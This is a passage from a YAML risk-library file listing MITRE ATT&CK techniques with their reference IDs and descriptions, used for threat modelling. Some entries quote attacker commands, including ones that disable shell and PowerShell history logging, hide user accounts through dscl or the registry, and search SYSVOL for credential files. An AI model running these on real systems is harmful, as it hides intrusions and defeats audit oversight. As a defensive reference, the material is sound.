      gain execution. Users may be subjected to social engineering to get them to
      execute malicious code by, for example, opening a malicious document file or
      link. These user actions will typically be observed as follow-on behavior from
      forms of [Phishing](https://attack.mitre.org/techniques/T1566).


      While [User Execution](https://attack.mitre.org/techniques/T1204) frequently
      occurs shortly after Initial Access it may occur at other phases of an intrusion,
      such as when an adversary places a file in a shared directory or on a user''s
      desktop hoping that a user will click on it. This activity may also be seen
      shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).


      Adversaries may also deceive users into performing actions such as:


      * Enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219),
      allowing direct control of the system to the adversary

      * Running malicious JavaScript in their browser, allowing adversaries to [Steal
      Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos
      Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)

      * Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)

      * Coerceing users to copy, paste, and execute malicious code manually(Citation:
      Reliaquest-execution)(Citation: proofpoint-selfpwn)


      For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566),
      vishing, or various forms of user interaction. Adversaries can use a combination
      of these methods, such as spoofing and promoting toll-free numbers or call centers
      that are used to direct victims to malicious websites, to deliver and execute
      payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation:
      Telephone Attack Delivery)

      https://attack.mitre.org/techniques/T1204'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.001
    ref_id: T1491.001
    name: Internal Defacement
    description: 'An adversary may deface systems internal to an organization in an
      attempt to intimidate or mislead users, thus discrediting the integrity of the
      systems. This may take the form of modifications to internal websites, or directly
      to user systems with the replacement of the desktop wallpaper.(Citation: Novetta
      Blockbuster) Disturbing or offensive images may be used as a part of [Internal
      Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause
      user discomfort, or to pressure compliance with accompanying messages. Since
      internally defacing systems exposes an adversary''s presence, it often takes
      place after other intrusion goals have been accomplished.(Citation: Novetta
      Blockbuster Destructive Malware)

      https://attack.mitre.org/techniques/T1491/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.002
    ref_id: T1564.002
    name: Hidden Users
    description: "Adversaries may use hidden users to hide the presence of user accounts\
      \ they create or modify. Administrators may want to hide users when there are\
      \ many user accounts on a given system or if they want to hide their administrative\
      \ or other management accounts from other users. \n\nIn macOS, adversaries can\
      \ create or modify a user to be hidden through manipulating plist files, folder\
      \ attributes, and user attributes. To prevent a user from being shown on the\
      \ login screen and in System Preferences, adversaries can set the userID to\
      \ be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code>\
      \ in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation:\
      \ Cybereason OSX Pirrit) Every user has a userID associated with it. When the\
      \ <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with\
      \ a userID under 500 do not appear on the login screen and in System Preferences.\
      \ Using the command line, adversaries can use the <code>dscl</code> utility\
      \ to create hidden user accounts by setting the <code>IsHidden</code> attribute\
      \ to <code>1</code>. Adversaries can also hide a user\u2019s home folder by\
      \ changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide\
      \ a User Account) \n\nAdversaries may similarly hide user accounts in Windows.\
      \ Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
      Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code>\
      \ for a specific user to prevent that user from being listed on the logon screen.(Citation:\
      \ FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems,\
      \ adversaries may hide user accounts from the login screen, also referred to\
      \ as the greeter. The method an adversary may use depends on which Display Manager\
      \ the distribution is currently using. For example, on an Ubuntu system using\
      \ the GNOME Display Manger (GDM), accounts may be hidden from the greeter using\
      \ the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen\
      \ disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display\
      \ Managers are not anchored to specific distributions and may be changed by\
      \ a user or adversary.\nhttps://attack.mitre.org/techniques/T1564/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.003
    ref_id: T1134.003
    name: Make and Impersonate Token
    description: 'Adversaries may make new tokens and impersonate users to escalate
      privileges and bypass access controls. For example, if an adversary has a username
      and password but the user is not logged onto the system the adversary can then
      create a logon session for the user using the `LogonUser` function.(Citation:
      LogonUserW function) The function will return a copy of the new session''s access
      token and the adversary can use `SetThreadToken` to assign the token to a thread.


      This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      in that this refers to creating a new user token instead of stealing or duplicating
      an existing one.

      https://attack.mitre.org/techniques/T1134/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.006
    ref_id: T1552.006
    name: Group Policy Preferences
    description: "Adversaries may attempt to find unsecured credentials in Group Policy\
      \ Preferences (GPP). GPP are tools that allow administrators to create domain\
      \ policies with embedded credentials. These policies allow administrators to\
      \ set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies\
      \ are stored in SYSVOL on a domain controller. This means that any domain user\
      \ can view the SYSVOL share and decrypt the password (using the AES key that\
      \ has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools\
      \ and scripts can be used to gather and decrypt the password file from Group\
      \ Policy Preference XML files:\n\n* Metasploit\u2019s post exploitation module:\
      \ <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation:\
      \ Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share,\
      \ adversaries may use the following command to enumerate potential GPP XML files:\
      \ <code>dir /s * .xml</code>\nhttps://attack.mitre.org/techniques/T1552/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.002
    ref_id: T1048.002
    name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
    description: "Adversaries may steal data by exfiltrating it over an asymmetrically\
      \ encrypted network protocol other than that of the existing command and control\
      \ channel. The data may also be sent to an alternate network location from the\
      \ main command and control server. \n\nAsymmetric encryption algorithms are\
      \ those that use different keys on each end of the channel. Also known as public-key\
      \ cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt\
      \ data from the corresponding key. Each end of the communication channels requires\
      \ a private key (only in the procession of that entity) and the public key of\
      \ the other entity. The public keys of each entity are exchanged before encrypted\
      \ communications begin. \n\nNetwork protocols that use asymmetric encryption\
      \ (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.\
      \ Adversaries may opt to use these encrypted mechanisms that are baked into\
      \ a protocol.\nhttps://attack.mitre.org/techniques/T1048/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.004
    ref_id: T1087.004
    name: Cloud Account
    description: "Adversaries may attempt to get a listing of cloud accounts. Cloud\
      \ accounts are those created and configured by an organization for use by users,\
      \ remote support, services, or for administration of resources within a cloud\
      \ service provider or SaaS application.\n\nWith authenticated access there are\
      \ several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code>\
      \ PowerShell cmdlet can be used to obtain account names given a role or permissions\
      \ group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub\
      \ Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user\
      \ accounts with authenticated access to a domain. The command <code>az ad user\
      \ list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation:\
      \ Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam\
      \ list-users</code> may be used to obtain a list of users in the current account\
      \ while <code>aws iam list-roles</code> can obtain IAM roles that have a specified\
      \ path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud\
      \ iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code>\
      \ may be used to obtain a listing of service accounts and users in a project.(Citation:\
      \ Google Cloud - IAM Servie Accounts List API)\nhttps://attack.mitre.org/techniques/T1087/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1057
    ref_id: T1057
    name: Process Discovery
    description: "Adversaries may attempt to get information about running processes\
      \ on a system. Information obtained could be used to gain an understanding of\
      \ common software/applications running on systems within the network. Administrator\
      \ or otherwise elevated access may provide better process details. Adversaries\
      \ may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057)\
      \ during automated discovery to shape follow-on behaviors, including whether\
      \ or not the adversary fully infects the target and/or attempts specific actions.\n\
      \nIn Windows environments, adversaries could obtain details on running processes\
      \ using the [Tasklist](https://attack.mitre.org/software/S0057) utility via\
      \ [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code>\
      \ via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information\
      \ about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106)\
      \ calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this\
      \ is accomplished with the <code>ps</code> command. Adversaries may also opt\
      \ to enumerate processes via `/proc`. \n\nOn network devices, [Network Device\
      \ CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show\
      \ processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation:\
      \ show_processes_cisco_cmd)\nhttps://attack.mitre.org/techniques/T1057"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.003
    ref_id: T1562.003
    name: Impair Command History Logging
    description: "Adversaries may impair command history logging to hide commands\
      \ they run on a compromised system. Various command interpreters keep track\
      \ of the commands users type in their terminal so that users can retrace what\
      \ they've done. \n\nOn Linux and macOS, command history is tracked in a file\
      \ pointed to by the environment variable <code>HISTFILE</code>. When a user\
      \ logs off a system, this information is flushed to a file in the user's home\
      \ directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code>\
      \ environment variable keeps track of what should be saved by the <code>history</code>\
      \ command and eventually into the <code>~/.bash_history</code> file when a user\
      \ logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but\
      \ can be set by the user and will be respected.\n\nAdversaries may clear the\
      \ history environment variable (<code>unset HISTFILE</code>) or set the command\
      \ history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging\
      \ of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore\
      \ commands that start with a space by simply setting it to \"ignorespace\".\
      \ <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting\
      \ it to \"ignoredups\". In some Linux systems, this is set by default to \"\
      ignoreboth\" which covers both of the previous examples. This means that \u201C\
      \ ls\u201D will not be saved, but \u201Cls\u201D would be saved by history.\
      \ Adversaries can abuse this to operate without leaving traces by simply prepending\
      \ a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code>\
      \ module tracks commands used in all PowerShell sessions and writes them to\
      \ a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>\
      \ by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption\
      \ -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code>\
      \ to stop receiving logs. Additionally, it is possible to turn off logging to\
      \ this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle\
      \ SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation:\
      \ Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History\
      \ Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ on network devices to disable historical command logging (e.g. <code>no logging</code>).\n\
      https://attack.mitre.org/techniques/T1562/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.008
    ref_id: T1556.008
    name: Network Provider DLL
    description: "Adversaries may register malicious network provider dynamic link\
      \ libraries (DLLs) to capture cleartext user credentials during the authentication\
      \ process. Network provider DLLs allow Windows to interface with specific network\
      \ protocols and can also support add-on credential management functions.(Citation:\
      \ Network Provider API) During the logon process, Winlogon (the interactive\
      \ logon module) sends credentials to the local `mpnotify.exe` process via RPC.\
      \ The `mpnotify.exe` process then shares the credentials in cleartext with registered\
      \ credential managers when notifying that a logon event is happening.(Citation:\
      \ NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries\
      \ can configure a malicious network provider DLL to receive credentials from\
      \ `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via\
      \ the Registry), a malicious DLL can receive and save credentials each time\
      \ a user logs onto a Windows workstation or domain via the `NPLogonNotify()`\
      \ function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious\
      \ network provider DLLs on systems known to have increased logon activity and/or\
      \ administrator logon activity, such as servers and domain controllers.(Citation:\
      \ NPPSPY - Huntress)\nhttps://attack.mitre.org/techniques/T1556/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.003
    ref_id: T1546.003
    name: Windows Management Instrumentation Event Subscription
    description: "Adversaries may establish persistence and elevate privileges by\
      \ executing malicious content triggered by a Windows Management Instrumentation\
      \ (WMI) event subscription. WMI can be used to install event filters, providers,\
      \ consumers, and bindings that execute code when a defined event occurs. Examples\
      \ of events that may be subscribed to are the wall clock time, user login, or\
      \ the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may\
      \ use the capabilities of WMI to subscribe to an event and execute arbitrary\
      \ code when that event occurs, providing persistence on a system.(Citation:\
      \ FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile\
      \ WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object\
      \ (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation:\
      \ Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription\
      \ execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus\
      \ may result in elevated SYSTEM privileges.\nhttps://attack.mitre.org/techniques/T1546/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.004
    ref_id: T1596.004
    name: CDNs
    description: "Adversaries may search content delivery network (CDN) data about\
      \ victims that can be used during targeting. CDNs allow an organization to host\
      \ content from a distributed, load balanced array of servers. CDNs may also\
      \ allow organizations to customize content delivery based on the requestor\u2019\
      s geographical region.\n\nAdversaries may search CDN data to gather actionable\
      \ information. Threat actors can use online resources and lookup tools to harvest\
      \ information about content servers within a CDN. Adversaries may also seek\
      \ and target CDN misconfigurations that leak sensitive information not intended\
      \ to be hosted and/or do not have the same protection mechanisms (ex: login\
      \ portals) as the content hosted on the organization\u2019s website.(Citation:\
      \ DigitalShadows CDN) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).\n\
      https://attack.mitre.org/techniques/T1596/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.002
    ref_id: T1497.002
    name: User Activity Based Checks
    description: 'Adversaries may employ various user activity checks to detect and
      avoid virtualization and analysis environments. This may include changing behaviors
      based on the results of checks for the presence of artifacts indicative of a
      virtual machine environment (VME) or sandbox. If the adversary detects a VME,
      they may alter their malware to disengage from the victim or conceal the core
      functions of the implant. They may also search for VME artifacts before dropping
      secondary or additional payloads. Adversaries may use the information learned
      from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      during automated discovery to shape follow-on behaviors.(Citation: Deloitte
      Environment Awareness)


      Adversaries may search for user activity on the host based on variables such
      as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual
      Jan 2016) , browser history, cache, bookmarks, or number of files in common
      directories such as home or the desktop. Other methods may rely on specific
      user interaction with the system before the malicious code is activated, such
      as waiting for a document to close before activating a macro (Citation: Unit
      42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image
      to activate.(Citation: FireEye FIN7 April 2017)

      https://attack.mitre.org/techniques/T1497/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.004
    ref_id: T1496.004
    name: Cloud Service Hijacking
    description: "Adversaries may leverage compromised software-as-a-service (SaaS)\
      \ applications to complete resource-intensive tasks, which may impact hosted\
      \ service availability. \n\nFor example, adversaries may leverage email and\
      \ messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification\
      \ Service (SNS), SendGrid, and Twilio, in order to send large quantities of\
      \ spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS\
      \ messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse\
      \ 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage\
      \ in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted\
      \ AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking\
      \ 2024)\n\nIn some cases, adversaries may leverage services that the victim\
      \ is already using. In others, particularly when the service is part of a larger\
      \ cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking\
      \ 2024) Leveraging SaaS applications may cause the victim to incur significant\
      \ financial costs, use up service quotas, and otherwise impact availability.\n\
      https://attack.mitre.org/techniques/T1496/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.003
    ref_id: T1585.003
    name: Cloud Accounts
    description: 'Adversaries may create accounts with cloud providers that can be
      used during targeting. Adversaries can use cloud accounts to further their operations,
      including leveraging cloud storage services such as Dropbox, MEGA, Microsoft
      OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002)
      or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts
      can also be used in the acquisition of infrastructure, such as [Virtual Private
      Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007)
      infrastructure. Establishing cloud accounts may allow adversaries to develop
      sophisticated capabilities without managing their own servers.(Citation: Awake
      Security C2 Cloud)


      Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may
      also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002)
      to register with the cloud provider.

      https://attack.mitre.org/techniques/T1585/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1072
    ref_id: T1072
    name: Software Deployment Tools
    description: "Adversaries may gain access to and use centralized software suites\
      \ installed within an enterprise to execute commands and move laterally through\
      \ the network. Configuration management and software deployment applications\
      \ may be used in an enterprise network or cloud environment for routine administration\
      \ purposes. These systems may also be integrated into CI/CD pipelines. Examples\
      \ of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft\
      \ Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide\
      \ or enterprise-wide endpoint management software may enable an adversary to\
      \ achieve remote code execution on all connected systems. The access may be\
      \ used to laterally move to other systems, gather information, or cause a specific\
      \ effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration\
      \ management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)\
      \ on cloud-hosted instances, as well as the execution of arbitrary commands\
      \ on on-premises endpoints. For example, Microsoft Configuration Manager allows\
      \ Global or Intune Administrators to run scripts as SYSTEM on on-premises devices\
      \ joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem\
      \ AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001)\
      \ to communicate back to adversary owned infrastructure.(Citation: Mitiga Security\
      \ Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices\
      \ may also have configuration management tools that can be similarly abused\
      \ by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected\
      \ Chinese Actor in Espionage Operation)\n\nThe permissions required for this\
      \ action vary by system configuration; local credentials may be sufficient with\
      \ direct access to the third-party system, or specific domain credentials may\
      \ be required. However, the system may require an administrative account to\
      \ log in or to access specific functionality.\nhttps://attack.mitre.org/techniques/T1072"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1041
    ref_id: T1041
    name: Exfiltration Over C2 Channel
    description: 'Adversaries may steal data by exfiltrating it over an existing command
      and control channel. Stolen data is encoded into the normal communications channel
      using the same protocol as command and control communications.

      https://attack.mitre.org/techniques/T1041'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.004
    ref_id: T1134.004
    name: Parent PID Spoofing
    description: 'Adversaries may spoof the parent process identifier (PPID) of a
      new process to evade process-monitoring defenses or to elevate privileges. New
      processes are typically spawned directly from their parent, or calling, process
      unless explicitly specified. One way of explicitly assigning the PPID of a new
      process is via the <code>CreateProcess</code> API call, which supports a parameter
      that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009)
      This functionality is used by Windows features such as User Account Control
      (UAC) to correctly set the PPID after a requested elevated process is spawned
      by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>)
      rather than the current user context.(Citation: Microsoft UAC Nov 2018)


      Adversaries may abuse these mechanisms to evade defenses, such as those blocking
      processes spawning directly from Office documents, and analysis targeting unusual/potentially
      malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)
      to be <code>explorer.exe</code> rather than an Office document delivered as
      part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation:
      CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual
      Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office
      document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation:
      CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)


      Explicitly assigning the PPID may also enable elevated privileges given appropriate
      access rights to the parent process. For example, an adversary in a privileged
      user context (i.e. administrator) may spawn a new process and assign the parent
      as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the
      new process to be elevated via the inherited access token.(Citation: XPNSec
      PPID Nov 2017)

      https://attack.mitre.org/techniques/T1134/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591
    ref_id: T1591
    name: Gather Victim Org Information
    description: 'Adversaries may gather information about the victim''s organization
      that can be used during targeting. Information about an organization may include
      a variety of details, including the names of divisions/departments, specifics
      of business operations, as well as the roles and responsibilities of key employees.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about an organization may also be exposed to adversaries via online or other
      accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Phishing for
      Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or
      [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1591'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1606
    ref_id: T1606
    name: Forge Web Credentials
    description: 'Adversaries may forge credential materials that can be used to gain
      access to web applications or Internet services. Web applications and services
      (hosted in cloud SaaS environments or on-premise servers) often use session
      cookies, tokens, or other materials to authenticate and authorize user access.


      Adversaries may generate these credential materials in order to gain access
      to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539),
      [Steal Application Access Token](https://attack.mitre.org/techniques/T1528),
      and other similar behaviors in that the credentials are new and forged by the
      adversary, rather than stolen or intercepted from legitimate users.


      The generation of web credentials often requires secret values, such as passwords,
      [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic
      seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may
      also forge tokens by taking advantage of features such as the `AssumeRole` and
      `GetFederationToken` APIs in AWS, which allow users to request temporary security
      credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)),
      or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication
      key that can be used to generate tokens for any user in the domain.(Citation:
      AWS Temporary Security Credentials)(Citation: Zimbra Preauth)


      Once forged, adversaries may use these web credentials to access resources (ex:
      [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)),
      which may bypass multi-factor and other authentication protection mechanisms.(Citation:
      Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation:
      Microsoft SolarWinds Customer Guidance)

      https://attack.mitre.org/techniques/T1606'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1621
    ref_id: T1621
    name: Multi-Factor Authentication Request Generation
    description: "Adversaries may attempt to bypass multi-factor authentication (MFA)\
      \ mechanisms and gain access to accounts by generating MFA requests sent to\
      \ users.\n\nAdversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ may be unable to complete the login process if they lack access to the 2FA\
      \ or MFA mechanisms required as an additional credential and security control.\
      \ To circumvent this, adversaries may abuse the automatic generation of push\
      \ notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta,\
      \ or similar services to have the user grant access to their account. If adversaries\
      \ lack credentials to victim accounts, they may also abuse automatic push notification\
      \ generation when this option is configured for self-service password reset\
      \ (SSPR).(Citation: Obsidian SSPR Abuse 2023)\n\nIn some cases, adversaries\
      \ may continuously repeat login attempts in order to bombard users with MFA\
      \ push notifications, SMS messages, and phone calls, potentially resulting in\
      \ the user finally accepting the authentication request in response to \u201C\
      MFA fatigue.\u201D(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation:\
      \ MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting\
      \ Government and Business Entities Around the Globe)\nhttps://attack.mitre.org/techniques/T1621"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1554
    ref_id: T1554
    name: Compromise Host Software Binary
    description: "Adversaries may modify host software binaries to establish persistent\
      \ access to systems. Software binaries/executables provide a wide range of system\
      \ commands or services, programs, and libraries. Common software binaries are\
      \ SSH clients, FTP clients, email clients, web browsers, and many other user\
      \ or server applications.\n\nAdversaries may establish persistence though modifications\
      \ to host software binaries. For example, an adversary may replace or otherwise\
      \ infect a legitimate application binary (or support files) with a backdoor.\
      \ Since these binaries may be routinely executed by applications or the user,\
      \ the adversary can leverage this for persistent access to the host. An adversary\
      \ may also modify a software binary such as an SSH client in order to persistently\
      \ collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation:\
      \ Google Cloud Mandiant UNC3886 2024)\n\nAn adversary may also modify an existing\
      \ binary by patching in malicious functionality (e.g., IAT Hooking/Entry point\
      \ patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary\u2019\
      s legitimate execution. For example, an adversary may modify the entry point\
      \ of a binary to point to malicious code patched in by the adversary before\
      \ resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)\n\
      \nAfter modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562)\
      \ by preventing it from updating (e.g., via the `yum-versionlock` command or\
      \ `versionlock.list` file in Linux systems that use the yum package manager).(Citation:\
      \ Google Cloud Mandiant UNC3886 2024)\nhttps://attack.mitre.org/techniques/T1554"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.008
    ref_id: T1552.008
    name: Chat Messages
    description: 'Adversaries may directly collect unsecured credentials stored or
      passed through user communication services. Credentials may be sent and stored
      in user chat communication applications such as email, chat services like Slack
      or Teams, collaboration tools like Jira or Trello, and any other services that
      support user communication. Users may share various forms of credentials (such
      as usernames and passwords, API keys, or authentication tokens) on private or
      public corporate internal communications channels.


      Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)),
      adversaries may directly access credentials within these services on the user
      endpoint, through servers hosting the services, or through administrator portals
      for cloud hosted services. Adversaries may also compromise integration tools
      like Slack Workflows to automatically search through messages to extract user
      credentials. These credentials may then be abused to perform follow-on activities
      such as lateral movement or privilege escalation (Citation: Slack Security Risks).

      https://attack.mitre.org/techniques/T1552/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.001
    ref_id: T1059.001
    name: PowerShell
    description: 'Adversaries may abuse PowerShell commands and scripts for execution.
      PowerShell is a powerful interactive command-line interface and scripting environment
      included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries
      can use PowerShell to perform a number of actions, including discovery of information
      and execution of code. Examples include the <code>Start-Process</code> cmdlet
      which can be used to run an executable and the <code>Invoke-Command</code> cmdlet
      which runs a command locally or on a remote computer (though administrator permissions
      are required to use PowerShell to connect to remote systems).


      PowerShell may also be used to download and run executables from the Internet,
      which can be executed from disk or in memory without touching disk.


      A number of PowerShell-based offensive testing tools are available, including
      [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194),
      [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github
      PSAttack)


      PowerShell commands/scripts can also be executed without directly invoking the
      <code>powershell.exe</code> binary through interfaces to PowerShell''s underlying
      <code>System.Management.Automation</code> assembly DLL exposed through the .NET
      framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick
      Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp
      APR 2014)

      https://attack.mitre.org/techniques/T1059/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.001
    ref_id: T1546.001
    name: Change Default File Association
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by a file type association. When a file is opened, the default program\
      \ used to open the file (also called the file association or handler) is checked.\
      \ File association selections are stored in the Windows Registry and can be\
      \ edited by users, administrators, or programs that have Registry access or\
